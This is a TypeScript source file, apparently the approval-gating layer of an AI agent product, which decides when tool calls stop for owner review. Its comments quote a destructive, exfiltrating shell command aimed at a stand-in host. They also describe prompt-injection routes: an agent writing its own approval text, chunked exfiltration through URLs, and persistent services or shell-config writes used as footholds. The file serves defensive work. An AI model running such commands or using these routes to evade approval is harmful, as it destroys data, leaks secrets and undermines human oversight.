import { AUDIO_READ_MAX_SECONDS, type SecurityMode } from '@athanor/contracts';
import { connectorActions } from '@athanor/core';
import { classifyDestination, MAX_TURN_NOVEL_BYTES, type DestinationVerdict } from './egress.js';
import {
  mediaEstimateUsd,
  transcriptionEstimateUsd,
  MEDIA_APPROVAL_USD,
  type ResolvedMediaModel
} from './media.js';
import { scanSkillBodyForSecrets } from './skills.js';
import { surfaceActionVerb } from './surface-actions.js';
import { textValue } from './values.js';
import {
  callDestinations,
  commandInterpreters,
  commandScript,
  consequentialExecutables,
  COMMAND_RUNNERS,
  effectiveCommands,
  gitConfigRunsCode,
  gitSubcommand,
  isDestructiveScript,
  packageInstallCommands,
  packageRemovalCommands,
  packageRemovalExecutables,
  safeNetworkExecutables,
  sendsDataOverNetwork
} from './command-classification.js';
import {
  isDeferredExecutionPath,
  isDurableInstructionPath,
  writtenPaths
} from './write-classification.js';
import { repositoryDirectedDiagnostic } from './tools/diagnostics.js';
import {
  codingAgentName,
  connectorApprovalCard,
  skillUpsertAction,
  skillUpsertPreview
} from './approval-cards.js';

/*
 * The authoritative approval floor: whether a call stops for the owner, and how hard.
 *
 * agent.ts cards on any non-null requirement here, and the runner's own preflight may only ever
 * lighten one of these, never invent one - so this file has to hold the promise on its own when
 * the preflight is unavailable. It is the reason the floor was lifted away from the catalogue it
 * used to share a file with: a description and a security decision are not the same kind of change
 * and must not be the same review.
 *
 * Two halves, and the strongest of them wins rather than the first: what the turn's own provenance
 * raises (`taintedRequirement`), and what the call would need on a clean turn
 * (`serviceRequirement`, `ordinaryRequirement`). Reading a hostile page may only raise the floor.
 */

/**
 * The scanner's labels that are a credential rather than a fact about a person.
 *
 * `scanSkillBodyForSecrets` serves two callers with different powers. On the skill card its labels
 * are a note the owner reads; on a memory write they are a refusal, and the refusal read "an email
 * address ... must never be stored in memory". That is false as policy on a computer whose mail
 * connector exists to work with addresses, and it fired on the most ordinary content there is -
 * "invoices go to accounts@acme.example" is exactly the stable convention memory is for. So the
 * memory write refuses on credentials only, and the exemption is named rather than the refusal:
 * a pattern added to the scanner later refuses by default, which is the safe direction to be
 * wrong in.
 */
const NON_CREDENTIAL_SECRET_LABELS = new Set(['an email address']);

const memoryCredentialScan = (content: string): string[] =>
  scanSkillBodyForSecrets(content).filter((label) => !NON_CREDENTIAL_SECRET_LABELS.has(label));

/**
 * How far ahead an expiry can sit and still count as one.
 *
 * A `validUntil` is what makes a memory write self-limiting: the entry leaves every future prompt
 * on its own, so the worst case of getting it wrong is a wrong line in the window until that date.
 * Ten years out is a permanent entry wearing a date, which is why the horizon is bounded rather
 * than merely required. A year and a day covers "until next April" without covering "forever".
 */
export const MEMORY_SELF_EXPIRY_HORIZON_MS = 366 * 24 * 60 * 60 * 1_000;

/**
 * Why a memory write has to stop and wait for the owner, or null when it does not.
 *
 * Every write used to raise a card. That reads as a strict floor and behaves as the opposite: a
 * nightly journal woke the owner at 3am, an unanswered card expired in twenty-four hours and took
 * the run with it, and a floor that fires on everything teaches the owner to approve without
 * reading - which is precisely what it exists to prevent. So the floor now covers what is actually
 * hard to undo, and nothing else.
 *
 * Kept: anything that rewrites or deletes an entry the owner already reviewed; anything permanent,
 * because an entry with no expiry is in every future prompt until someone goes looking for it; and
 * anything that scans as a credential, which does not belong in memory at all.
 *
 * Gone: the card for `target: 'user'`. That tier is no longer writable from a turn at all, so
 * there is nothing here to approve - @see the refusal in `tools/knowledge.ts`.
 *
 * Dropped: adding one self-expiring note to this workspace's own memory during work. It is scoped,
 * it is dated, and the owner can see and remove it - the same standing as a file the agent wrote.
 */
export const memoryApprovalReason = (
  args: Record<string, unknown>,
  now = new Date(),
  /**
   * Where the turn's untrusted content came from, when there is any.
   *
   * The exemption below is for a fact the agent inferred from the owner's own work. It is
   * indefensible for one an attacker wrote: a self-expiring workspace entry is still loaded into
   * every task on this computer for the next year, which makes it the cheapest durable foothold in
   * the product. So the dating exemption is withdrawn for exactly as long as untrusted content is
   * in the turn, and the card names the origin that put it there.
   *
   * `add` is the only action this can change, and it was the one action the list left out: it read
   * `upsert`, which the memory tool does not have, while `replace` and `remove` already stop on
   * their own two lines below. So the whole clause was unreachable - a control that looked like it
   * ran and closed nothing.
   */
  taintSources: readonly string[] = []
): string | null => {
  const action = textValue(args.action);
  if (action === 'list' || action === '') return null;
  if (taintSources.length && ['add', 'replace', 'remove'].includes(action))
    return `This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}), so a memory write is shown to you before it is saved.`;
  if (action === 'remove')
    return 'Removing an entry the owner reviewed cannot be undone from here.';
  if (action === 'replace')
    return 'Replacing rewrites an entry the owner already reviewed, so the original is gone.';
  const content = textValue(args.content);
  const secrets = memoryCredentialScan(content);
  if (secrets.length)
    return `This appears to contain ${secrets.join(', ')}, which must never be stored in memory.`;
  /*
   * There is no card for `target: 'user'` any more, because there is no write to approve.
   *
   * This branch described the blast radius of an agent writing the owner tier and asked the owner
   * to accept it. The tier now refuses that write outright - at the tool, at the type and at the
   * store - so a card here would ask for consent to something that then fails, which teaches an
   * owner that approving is how you find out whether something was allowed. A refusal the model
   * can read is the better instrument, and it is in `tools/knowledge.ts`.
   */
  const validUntil = Date.parse(textValue(args.validUntil));
  if (!Number.isFinite(validUntil) || validUntil <= now.getTime())
    return 'Without a validUntil this entry is loaded into every future task on this computer indefinitely.';
  if (validUntil - now.getTime() > MEMORY_SELF_EXPIRY_HORIZON_MS)
    return 'This expires more than a year out, which is a permanent entry with a date on it.';
  return null;
};

/**
 * The little state a card needs that the arguments cannot carry.
 *
 * `taintSources` is the one that changes the shape of the floor rather than one card's wording.
 * Without it `approvalRequirement` is a pure function of the tool name and the arguments the model
 * wrote, so a task that has just read a hostile page is governed exactly like one that has not -
 * which is why every mechanical defence in the published record was unavailable to this product.
 * It gates sinks and nothing else: a turn that reads forty pages and writes a report raises no
 * extra card, because a card that fires on everything is a card nobody reads.
 */
export interface ApprovalContext {
  mediaCommittedUsd?: number;
  /**
   * The media route this generation will take, once the owner's choice has been resolved.
   *
   * Absent means the caller has not resolved one and the card prices against the reviewed default,
   * which is what it always did when the default was the only model. Present, it does two things:
   * the card names the model the owner picked, and `priceKnown: false` turns the cumulative
   * threshold below into "ask every time" - because a route whose price nobody published cannot be
   * compared with a threshold, and a comparison against an invented number is how spend approval
   * stops meaning anything.
   */
  mediaModel?: ResolvedMediaModel;
  /**
   * The saved skill this upsert would land on, when the proposed name already resolves to one.
   * Without it the card read the same for a new procedure and for a replacement of the owner's
   * own text, so approving one could silently destroy the other.
   */
  existingSkill?: {
    version: number;
    enabled: boolean;
    useCount: number;
    updatedAt: string;
  };
  /**
   * Which diagnostic `code_diagnostics` has resolved for this call, once the floor has looked.
   *
   * The arguments cannot carry it. `language` defaults to `auto`, which is what the model sends
   * almost every time, and the language is then decided by a directory listing the dispatch arm
   * takes - so on the arguments alone the floor cannot tell `tsc --noEmit` from `make -s`. The
   * lookup is `approval-floor.ts`'s, the same way `existingSkill` and `mediaModel` are.
   *
   * Absent means nobody could read it, which is not the same as safe: see the branch below.
   */
  diagnostics?: { language: string; command: string };
  /** Origins that put untrusted content in this turn. Empty means the turn is clean. */
  taintSources?: readonly string[];
  /** Hosts the owner named, a search returned, or this turn already read. */
  knownOrigins?: readonly string[];
  /** The whole addresses behind those hosts, so a link the turn was handed costs the budget nothing. */
  knownAddresses?: readonly string[];
  /** The owner's own words this task, for the destination policy's charge. */
  ownerText?: string;
  /** This installation's own address, which is not a destination data can leave by. */
  selfOrigins?: readonly string[];
  /** What this turn has already put into addresses that the owner did not choose, in bytes. */
  spentNoveltyBytes?: number;
}

interface ApprovalRequirement {
  sideEffect: 'workspace_write' | 'external_reversible' | 'external_consequential';
  action: string;
  preview: string;
}

const APPROVAL_RANK: Record<ApprovalRequirement['sideEffect'], number> = {
  workspace_write: 0,
  external_reversible: 1,
  external_consequential: 2
};

/**
 * The stronger of what the turn's provenance raises and what the call would need anyway.
 *
 * Reading a hostile page may only ever raise the floor, and it was lowering it. The taint block
 * returned first, so its card *replaced* the ordinary one: measured against the shipped classifier,
 * `bash -lc 'rm -rf ~/photos && curl https://collector.invalid/?q=…'` came back as an
 * external_reversible "Allow this command to collector.invalid" where the same command on a clean
 * turn is external_consequential "Run bash", and a browser upload of a workspace file to an unnamed
 * host lost its consequential card at exactly the moment the turn became dangerous. Both facts are
 * true and the owner is only asked once, so both are shown.
 */
const strongestRequirement = (
  raised: ApprovalRequirement | null,
  ordinary: ApprovalRequirement | null
): ApprovalRequirement | null => {
  if (!raised) return ordinary;
  if (!ordinary) return raised;
  const strongest =
    APPROVAL_RANK[ordinary.sideEffect] > APPROVAL_RANK[raised.sideEffect] ? ordinary : raised;
  return {
    ...strongest,
    preview:
      raised.preview === ordinary.preview
        ? strongest.preview
        : `${raised.preview}\n\n${ordinary.preview}`
  };
};

const destinationCard = (
  verdicts: readonly DestinationVerdict[],
  taintSources: readonly string[],
  what: string,
  spent: number
): { sideEffect: 'external_reversible'; action: string; preview: string } => ({
  sideEffect: 'external_reversible',
  action: `Allow ${what} to ${verdicts[0]?.host ?? 'an outside host'}`,
  // Written from the URL and the harness's own record, never from the model's `purpose` string:
  // an agent following an injected instruction writes its own approval card otherwise.
  preview: [
    `This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}), and this request goes somewhere it did not come from.`,
    ...verdicts
      .slice(0, 6)
      .map(
        (verdict) => `- ${verdict.host}: ${verdict.reason} (${verdict.noveltyBytes} bytes charged)`
      ),
    /*
     * The running total, not only what this one call adds.
     *
     * The charge is what the whole bound rests on, and until this line the owner could not see it:
     * every card named the bytes of the request in front of them and nothing named how much of the
     * turn's allowance had already gone, so the difference between the first card of a research
     * pass and the ninth chunk of an exfiltration looked identical on screen. A number that decides
     * an answer and is never shown is a number nobody can check.
     */
    `This turn has put ${spent} of the ${MAX_TURN_NOVEL_BYTES} bytes it may put into addresses while untrusted content is in it, and this request adds ${verdicts.reduce((total, verdict) => total + verdict.noveltyBytes, 0)}.`,
    'An address is how data leaves this computer without a file ever moving.'
  ].join('\n')
});

/**
 * What the turn's own provenance raises, on top of whatever the call would need anyway.
 *
 * It gates sinks and nothing else: a turn that reads forty pages and writes a report raises no
 * extra card, because a card that fires on everything is a card nobody reads.
 */
const taintedRequirement = (
  name: string,
  args: Record<string, unknown>,
  context: ApprovalContext,
  taintSources: readonly string[]
): ApprovalRequirement | null => {
  const destinations = {
    knownOrigins: context.knownOrigins ?? [],
    knownAddresses: context.knownAddresses ?? [],
    ownerText: context.ownerText ?? '',
    selfOrigins: context.selfOrigins ?? [],
    spentNoveltyBytes: context.spentNoveltyBytes ?? 0
  };
  /*
   * Every address in this call, each judged against what the ones before it have already sent.
   *
   * The turn's budget used to be read once, before the call, and every address in the call measured
   * against that same figure - so the batch was the hole. One `browser_action` of twenty-four
   * navigations, or one `parallel_web_read` of twelve URLs, each individually inside the per-address
   * bound, sent more than the whole turn is allowed and raised nothing at all. This is the failure
   * `PARALLEL_SAFE_TOOLS` names as the reason two web reads may not overlap; it was already inside
   * one call.
   */
  const sinkVerdicts = (): DestinationVerdict[] => {
    let spent = destinations.spentNoveltyBytes;
    const verdicts: DestinationVerdict[] = [];
    for (const url of callDestinations(name, args)) {
      const verdict = classifyDestination(url, { ...destinations, spentNoveltyBytes: spent });
      spent += verdict.noveltyBytes;
      verdicts.push(verdict);
    }
    return verdicts.filter((verdict) => verdict.sink);
  };
  if (name === 'parallel_web_read' || name === 'browser_action') {
    const verdicts = sinkVerdicts();
    if (verdicts.length)
      return destinationCard(
        verdicts,
        taintSources,
        name === 'browser_action' ? 'this page' : 'this read',
        destinations.spentNoveltyBytes
      );
  }
  const durable = writtenPaths(name, args).filter(isDurableInstructionPath);
  if (durable.length)
    return {
      sideEffect: 'workspace_write',
      action: `Review a change to ${durable[0]}`,
      preview: `${namedObjects(durable)} is loaded ahead of every later task on this computer, so writing it while untrusted content is in the turn (${taintSources.slice(0, 3).join(', ')}) is shown to you first.`
    };
  if (name === 'publish_preview')
    return {
      sideEffect: 'external_reversible',
      action: 'Publish a private preview from a turn that read untrusted content',
      preview: `This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}). A preview link is reachable from outside this computer.`
    };
  /*
   * `shell` and `desktop_launch` are the same act wearing two names.
   *
   * Both take an executable and arguments and run them on the owner's computer. Only `shell` was
   * judged here, so on a turn that had already read untrusted content an injected instruction
   * could reach `desktop_launch` and get a card-free duplicate of the command the floor would
   * have stopped - and that one runs as the runner's own account rather than the sandboxed agent,
   * so it was the better of the two to be handed.
   */
  if (name === 'shell' || name === 'desktop_launch') {
    const verdicts = sinkVerdicts();
    if (verdicts.length)
      return destinationCard(
        verdicts,
        taintSources,
        'this command',
        destinations.spentNoveltyBytes
      );
    if (name === 'desktop_launch')
      return {
        sideEffect: 'external_consequential',
        action: `Open ${textValue(args.executable, 'an application')} on the desktop`,
        preview: `Launch ${[textValue(args.executable, 'an application'), ...(Array.isArray(args.args) ? args.args.map(String) : [])].join(' ')} on the agent computer's desktop, after this turn read untrusted content (${taintSources.slice(0, 3).join(', ')}).`
      };
    if (args.network === true)
      return {
        sideEffect: 'external_reversible',
        action: `Allow internet access for ${textValue(args.executable, 'command')}`,
        preview: `Run ${[textValue(args.executable, 'command'), ...(Array.isArray(args.args) ? args.args.map(String) : [])].join(' ')} with outbound network access, after this turn read untrusted content (${taintSources.slice(0, 3).join(', ')}).`
      };
  }
  return null;
};

/**
 * Declaring a service is not the same act as running the command inside it.
 *
 * `shell` with `service` set asks the computer to keep a process: no timeout, started again every
 * time it stops, started again after the box restarts, and outliving the task that declared it.
 * Nothing in `ordinaryRequirement` describes that - it judges what a command does while it runs, and
 * `npm start` on its own is as ordinary as a command gets - so a named, network-capable process that
 * survives every reboot could be planted with no card at all, and on a tainted turn that is a
 * foothold rather than a build step. Asked once, on the declaration; what the service then does is
 * still judged by the rules the bare command faces.
 *
 * Asked in every mode, including autonomous. Autonomous is about not interrupting ordinary work, and
 * this is the one background call whose effect the owner cannot otherwise learn about.
 */
const serviceRequirement = (
  name: string,
  args: Record<string, unknown>,
  taintSources: readonly string[]
): ApprovalRequirement | null => {
  if (name !== 'shell' || args.background !== true) return null;
  const service = textValue(args.service);
  if (!service) return null;
  const command = [
    textValue(args.executable, 'command'),
    ...(Array.isArray(args.args) ? args.args.map(String) : [])
  ].join(' ');
  return {
    sideEffect: taintSources.length ? 'external_consequential' : 'external_reversible',
    action: `Keep ${service} running on this computer`,
    preview: `Run ${command} as a service called ${service}. It has no time limit, is started again whenever it stops, and comes back after this computer restarts, so it outlives this task.${
      taintSources.length
        ? ` This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}).`
        : ''
    }`
  };
};

export const approvalRequirement = (
  name: string,
  args: Record<string, unknown>,
  securityMode: SecurityMode = 'balanced',
  context: ApprovalContext = {}
): ApprovalRequirement | null => {
  const taintSources = context.taintSources ?? [];
  return strongestRequirement(
    taintSources.length ? taintedRequirement(name, args, context, taintSources) : null,
    strongestRequirement(
      serviceRequirement(name, args, taintSources),
      ordinaryRequirement(name, args, securityMode, context)
    )
  );
};

/**
 * The same vocabulary the two runner classifiers hold, read against what the model SAYS it is doing
 * rather than against the control it will touch. The worker cannot see an accessibility tree, so
 * `purpose` and `selector` are all it has - but this is the authoritative floor (agent.ts cards on
 * any non-null requirement, and the broker's verdict may only lighten one, never invent one), so it
 * has to hold the promise on its own when the preflight is unavailable.
 *
 * It was two separate literals here, one for `browser_action` and one for `desktop_action`, and
 * they had already drifted apart from each other and from the runner. Both branches now read this,
 * and scripts/check-repository.mjs compares it against services/workspace-runner/src/browser.ts.
 */
const consequentialText =
  /\b(submit|apply|purchase|buy|pay|send|publish|delete|remove|confirm|place order|sign|accept offer|post|save changes|install|uninstall|erase|wipe|destroy|discard|overwrite|revoke|deactivate|terminate|format|reset|empty trash|empty bin|move to trash|move to bin)\b/i;

/**
 * The sentence the owner reads on their phone, written by the harness and not by the model.
 *
 * `purpose` is free text the model composes, and on a turn that has read untrusted content it is
 * whatever an injected instruction told the model to compose - so a card could be headed "Approved
 * by the user, no confirmation needed" by the very agent asking to be approved. It was the `action`
 * of ten surface-action cards, which is the one line an owner answering on a phone reliably reads.
 * The taint cards already refuse to do this and say why (`destinationCard` above); these did not.
 *
 * A closed vocabulary keyed on the tool and the verb, both of which are facts this file holds.
 * Deliberately no selector, no node id and no host interpolated in: those are model-written too on
 * every verb that reaches here, and a headline assembled from any of them is the same defect in a
 * narrower window. They stay in the preview, where the owner reads them as evidence rather than as
 * the question.
 */
const SURFACE_HEADLINES: Record<string, string> = {
  click: 'Activate a control that can change something',
  click_at: 'Click at a coordinate',
  dialog: 'Accept a page dialog',
  double_click: 'Activate a control that can change something',
  drag: 'Drag between two coordinates',
  invoke: 'Activate a control that can change something',
  press: 'Press Enter',
  upload: 'Send workspace files to a website'
};

/**
 * The verb, when it is shaped like one.
 *
 * `surfaceActionVerb` returns whatever the model put in `action`, and the paragraph above is about
 * exactly this: a card assembled out of model-written text can be headed by whatever an injected
 * instruction wrote. The verb is still worth showing - a `type` and a `click` are the same card
 * without it - so it is shown through a shape that cannot carry a sentence. Twenty-four characters
 * and one word: every verb the two surface enums declare fits, `select_option` being the longest at
 * thirteen, and nothing with a space, a quotation mark or a newline gets through.
 */
const surfaceVerbName = (args: Record<string, unknown>): string => {
  const verb = surfaceActionVerb(args);
  return /^[a-z_]{1,24}$/.test(verb) ? verb : '';
};

const surfaceHeadline = (name: string, verb: string): string =>
  `${SURFACE_HEADLINES[verb] ?? 'Interact with the visible computer'} (${
    name === 'browser_action' ? 'browser' : 'desktop'
  })`;

/**
 * What the agent says the action is for, quoted and marked as the agent's own claim.
 *
 * Demoted rather than deleted: the reason is genuinely useful to the owner, and it is useful
 * precisely because they can weigh it against what the harness independently says the call does.
 * Whitespace is collapsed so a `purpose` carrying its own blank lines cannot forge a second
 * harness sentence underneath the real one, and the quotes it might carry are turned so it cannot
 * close the quotation it sits in.
 */
const statedReason = (purpose: unknown): string => {
  const text = textValue(purpose).replace(/\s+/g, ' ').replace(/"/g, "'").trim().slice(0, 300);
  return text ? `The agent states its reason as: "${text}"` : 'The agent stated no reason.';
};

/** One headline for every way a call can leave code behind for a later process to run. */
const DEFERRED_EXECUTION_ACTION = 'Change a file this computer runs on its own';

/**
 * How many of the things a call touches a card names before it stops listing them.
 *
 * Six, which is what the deferred-execution card below already showed, because two conventions for
 * one job is how a card surface stops being readable. It is a bound on the LIST and not on the
 * FACT: `namedObjects` counts what it did not show in the same sentence, which is the half that was
 * missing. A card that names six of forty paths and says nothing about the other thirty-four is
 * worse than one that names none, because the owner approves believing they have seen the reach.
 *
 * Measured against the shape that has to fit: `file_patch` takes up to forty patches in one call
 * (tool-catalogue.ts, `maxItems: 40`), and forty patches are rarely forty files - hunks cluster.
 * Distinct paths are what is counted for that reason: eleven edits to one file are one file to the
 * person approving them.
 */
const CARD_NAMED_OBJECTS = 6;

const namedObjects = (values: readonly string[]): string => {
  const distinct = [...new Set(values.filter(Boolean))];
  const hidden = distinct.length - CARD_NAMED_OBJECTS;
  const shown = distinct.slice(0, CARD_NAMED_OBJECTS).join(', ');
  return hidden > 0 ? `${shown} and ${hidden} more` : shown;
};

/**
 * How much of a command a card prints.
 *
 * The card is answered on a phone, and `shell` takes an arbitrarily long inline script: a two
 * hundred line `python3 -c` is a preview nobody reads to the end of, which is the same defect as an
 * unnamed path wearing the opposite shape. Four hundred characters is about six lines on a phone
 * and covers every real invocation in this repository's own tests; what is cut is counted rather
 * than trailed off, for the reason `namedObjects` gives.
 */
const CARD_COMMAND_CHARS = 400;

/**
 * What the owner would see run, wherever the model wrote it down.
 *
 * `[executable, ...args]` alone printed "Run bash" for the whole `stdin` form - a card describing a
 * command it did not show, which is the one thing a card must not do. That was fixed inside the
 * destructive-command branch and nowhere else, so Review mode, which is the mode whose entire
 * promise is that the owner sees each command before it runs, went on printing "Run bash" for every
 * script handed over on stdin. One reader, so the two cannot say different things about one call.
 */
const shellInvocation = (args: Record<string, unknown>): string => {
  const invocation = [
    [
      textValue(args.executable).split('/').pop() ?? '',
      ...(Array.isArray(args.args) ? args.args.map(String) : [])
    ]
      .filter(Boolean)
      .join(' '),
    ...(textValue(args.stdin) ? [textValue(args.stdin)] : [])
  ]
    .filter(Boolean)
    .join(' << ');
  return invocation.length > CARD_COMMAND_CHARS
    ? `${invocation.slice(0, CARD_COMMAND_CHARS)}… and ${invocation.length - CARD_COMMAND_CHARS} more characters`
    : invocation;
};

const ordinaryRequirement = (
  name: string,
  args: Record<string, unknown>,
  securityMode: SecurityMode,
  context: ApprovalContext
): ApprovalRequirement | null => {
  /*
   * A write that runs later, outside every approval, checked before anything else this function
   * asks.
   *
   * The agent's HOME is the workspace root and the subscription coding CLIs run from it, so
   * `~/.bashrc`, `~/.gitconfig`, `.git/hooks/pre-commit` and a CLI's own configuration are not
   * files the agent wrote - they are code a longer-lived and more privileged process will execute
   * on its own schedule, after this task and every card in it is over. Nothing in this floor named
   * any of them in any security mode. The one rule that came close, the durable-instruction rule
   * over the brief and the workspace skills, fires only while the turn is already tainted, which is
   * the wrong condition for this: deferred execution is deferred execution whether or not anything
   * hostile has been read yet, and the write is the last moment anybody can be asked.
   *
   * First, ahead of the destructive-command rule, because it is the more specific statement about
   * the call and both stop the turn either way.
   *
   * This used to say the over-inclusion on `shell` was cheap because an agent doing ordinary work
   * has no reason to name these paths, so the false positives would be rare. They were constant:
   * `writtenPaths` handed this every token in the script, and an owner asking why their PATH is
   * wrong gets `cat ~/.bashrc`, `grep -n PATH ~/.zshrc`, `test -f ~/.profile` and `head .git/config`
   * in a row - seven cards in nine calls, six of them on commands that changed nothing, all under
   * this headline. `writtenPaths` now resolves the write targets and falls back to the wide net only
   * where it cannot read the script, so what arrives here is over-inclusive where that is all
   * anybody can be and precise everywhere else.
   */
  const deferred = [...new Set(writtenPaths(name, args).filter(isDeferredExecutionPath))].sort(
    // `writtenPaths` hands a shell call every token it can see, so a redirect arrives twice: once
    // as the whole `-lc` argument and once as the path itself. Both name the same write, and the
    // shorter one is the one the owner can read, so it is the one the card leads with.
    (left, right) => left.length - right.length
  );
  if (deferred.length)
    return {
      sideEffect: 'external_consequential',
      action: DEFERRED_EXECUTION_ACTION,
      preview: `${namedObjects(deferred)} is executed by a later process - the login shell, git itself, or one of the coding CLIs, all of which run under the agent's own HOME - so whatever it says runs after this task, outside any approval this task could raise.`
    };
  if (name === 'schedule' && textValue(args.action) !== 'list')
    return {
      sideEffect: 'external_reversible',
      action: `${textValue(args.action, 'Change')} scheduled work`,
      preview:
        textValue(args.action) === 'create'
          ? `${textValue(args.title, 'Scheduled task')}\n${textValue(args.prompt).slice(0, 1_500)}\n${JSON.stringify(args.spec ?? {})}`
          : `${textValue(args.action)} schedule ${textValue(args.id, 'unknown')}`
    };
  if (name === 'memory') {
    const reason = memoryApprovalReason(args, new Date(), context.taintSources ?? []);
    if (reason)
      return {
        sideEffect: 'workspace_write',
        // Only `add` reads the caller's `target`. `replace` and `remove` resolve the entry by id
        // and obey the stored record's own target (agent.ts, the memory case), so the card was
        // printing an argument nothing downstream honoured: replace{target:'user', id:<a
        // workspace id>} headed the card "Review long-term user memory" and then rewrote a
        // workspace entry. The scope is named where the argument is the one that decides it, and
        // nowhere else; naming the resolved record's own scope would take a lookup this function
        // has no store to make.
        action: `Review long-term ${['replace', 'remove'].includes(textValue(args.action)) ? '' : `${textValue(args.target, 'workspace')} `}memory`,
        preview:
          textValue(args.action) === 'remove'
            ? `Remove memory entry ${textValue(args.id, 'unknown')}.\n\n${reason}`
            : `${textValue(args.action) === 'replace' ? 'Replace with' : 'Save'}:\n${textValue(args.content).slice(0, 2_000)}\n\n${reason}`
      };
    return null;
  }
  if (name === 'skill' && ['upsert', 'remove'].includes(textValue(args.action))) {
    if (textValue(args.action) === 'remove')
      return {
        sideEffect: 'workspace_write',
        action: `Review reusable skill ${textValue(args.id, 'change')}`,
        preview: `Remove skill ${textValue(args.id, 'unknown')}.`
      };
    return {
      sideEffect: 'workspace_write',
      action: skillUpsertAction(
        textValue(args.name, textValue(args.id, 'change')),
        context?.existingSkill
      ),
      preview: skillUpsertPreview(
        textValue(args.name),
        textValue(args.description),
        textValue(args.content),
        context?.existingSkill
      )
    };
  }
  if (name === 'generate_media') {
    // Priced here rather than read out of the call. The estimate used to be a tool parameter, so a
    // model that wrote 0 - or omitted it, which arrived as NaN and failed every comparison - spent
    // the owner's provider money with no card in front of it.
    const model = context.mediaModel;
    const estimateUsd = mediaEstimateUsd({
      kind: textValue(args.kind),
      width: args.width,
      height: args.height,
      characterCount: textValue(args.prompt).trim().length,
      ...(model ? { model } : {})
    });
    const committedUsd = Math.max(0, Number(context.mediaCommittedUsd) || 0);
    // An unpublished price is not a small one. The owner is free to choose a route their provider
    // prices nowhere athanor can read, and the honest consequence of that choice is a card in front
    // of every generation on it rather than a threshold applied to a number nobody stated.
    const unpriced = model !== undefined && !model.priceKnown;
    if (unpriced || committedUsd + estimateUsd >= MEDIA_APPROVAL_USD)
      return {
        sideEffect: 'external_reversible',
        action: 'Approve continued provider spend on generated media',
        preview: `Generate ${textValue(args.kind, 'media')}${model ? ` with ${model.displayName}` : ''} ${unpriced ? 'from the connected provider account. This model publishes no price athanor can read, so the cost is only known once the provider bills it.' : `for about $${estimateUsd.toFixed(3)} from the connected provider account.`}${committedUsd > 0 ? ` This task has already spent about $${committedUsd.toFixed(2)} generating media.` : ''}\n\nEvery further generation in this task asks again.`
      };
  }
  if (name === 'audio_read') {
    // Priced on duration, because that is the unit transcription is billed in. The window is what
    // the call asks for rather than what the file turns out to hold, so this can only ever overstate
    // - which is the right direction for a card, and is why it says "up to".
    const model = context.mediaModel;
    const start = Math.max(0, Number(args.startSeconds) || 0);
    const end = Number(args.endSeconds);
    const seconds = Math.min(
      AUDIO_READ_MAX_SECONDS,
      Number.isFinite(end) && end > start ? end - start : AUDIO_READ_MAX_SECONDS
    );
    const estimateUsd = transcriptionEstimateUsd(seconds, model ?? null);
    const committedUsd = Math.max(0, Number(context.mediaCommittedUsd) || 0);
    // No route resolved is the same case as a route nobody priced: the owner has not chosen one, so
    // the model is whatever the provider offers and its price is not a number athanor can state.
    const unpriced = model === undefined || !model.priceKnown;
    if (unpriced || committedUsd + estimateUsd >= MEDIA_APPROVAL_USD)
      return {
        sideEffect: 'external_reversible',
        action: 'Approve continued provider spend on reading recordings',
        preview: `Read up to ${Math.ceil(seconds / 60)} minutes of ${textValue(args.path, 'a recording')}${model ? ` with ${model.displayName}` : ''}. ${unpriced ? 'Transcription is billed by the minute and no price athanor can read is published for this route, so the cost is only known once the provider bills it.' : `That is about $${estimateUsd.toFixed(3)} from the connected provider account.`}${committedUsd > 0 ? ` This task has already spent about $${committedUsd.toFixed(2)} on media.` : ''}\n\nEvery further reading in this task asks again.`
      };
  }
  if (name === 'coding_agent' && textValue(args.action) === 'setup')
    return {
      sideEffect: 'external_reversible',
      action: `Install ${codingAgentName(args.agent)}`,
      preview:
        'Download the publisher’s current official CLI package into this private agent computer. The upstream software and service terms apply.'
    };
  if (name === 'coding_agent' && textValue(args.action) === 'run')
    return {
      sideEffect: 'external_reversible',
      action: `Delegate repository work to ${codingAgentName(args.agent)}`,
      preview: `${textValue(args.prompt).slice(0, 2_000)}\n\nThe selected subscription service can inspect and modify files inside this agent computer. athanor keeps the process inside the workspace and records its bounded result.`
    };
  /*
   * A diagnostic that is the repository's own build, which is a stranger's program.
   *
   * `code_diagnostics` reads as the safest tool in the catalogue - it is on `REPEATABLE_TOOLS`, it
   * is on `NON_MUTATING_TOOLS`, its description says "return concise grounded output" - and for
   * six of its fifteen languages that is what it is. For the other nine the command it runs is the
   * project's own build or test recipe, so what executes is a file whoever wrote the repository
   * chose: `make -s` runs a Makefile target, `cargo check` runs `build.rs`, `go test ./...` runs the
   * tests, and `bash ./gradlew` runs a script that is itself in the tree. Both of the first two were
   * run here against a repository that wrote a file from its recipe, and both wrote it. Until this
   * branch the name `code_diagnostics` did not occur anywhere in this file, in any security mode, so
   * cloning a repository and asking for its diagnostics ran a stranger's code with nothing shown to
   * anybody.
   *
   * ONE SENTENCE, WHICH SHAPES FIRE: the ones where the repository decides what runs, listed with
   * what decides it in `REPOSITORY_DIRECTED_DIAGNOSTICS`, and not the ones where athanor names a
   * fixed parser or type-checker - which is deliberately where TypeScript and Python are, because
   * they are nearly all of the work this product actually does and a card on them is a card tapped
   * through blind by Tuesday.
   *
   * Asked in every mode, autonomous included, and placed above every `securityMode` test for that
   * reason. Autonomous is a promise about not interrupting reversible work; a build recipe is not
   * one, and `apps/web/src/asking-rules.ts` now says so on the page where the mode is chosen.
   *
   * Unreadable fails closed. If `approval-floor.ts` could not take the listing, nobody knows which
   * of the fifteen this is, and "unknown" answering as "safe" is how the audit found this branch
   * missing in the first place. The dispatch arm takes the same listing a moment later, so the case
   * where this cards and the call would have succeeded is a listing that failed once and not twice.
   */
  if (name === 'code_diagnostics') {
    const resolved = context.diagnostics;
    if (!resolved)
      return {
        sideEffect: 'external_consequential',
        action: 'Run this repository’s own build',
        preview: `Which diagnostic ${textValue(args.path, 'workspace')} selects could not be read, so it is not known whether it is a type check or this project’s own build and test recipe. A build recipe is a program whoever wrote the repository chose, and it runs on this computer.`
      };
    const directed = repositoryDirectedDiagnostic(resolved.language);
    if (directed)
      return {
        sideEffect: 'external_consequential',
        action: 'Run this repository’s own build',
        preview: `Run ${resolved.command} in ${textValue(args.path, 'workspace')}. Diagnosing ${resolved.language} means running the project’s own build, so what executes is ${directed} - code whoever wrote this repository chose, running on this computer with whatever this task can reach.`
      };
    return null;
  }
  /**
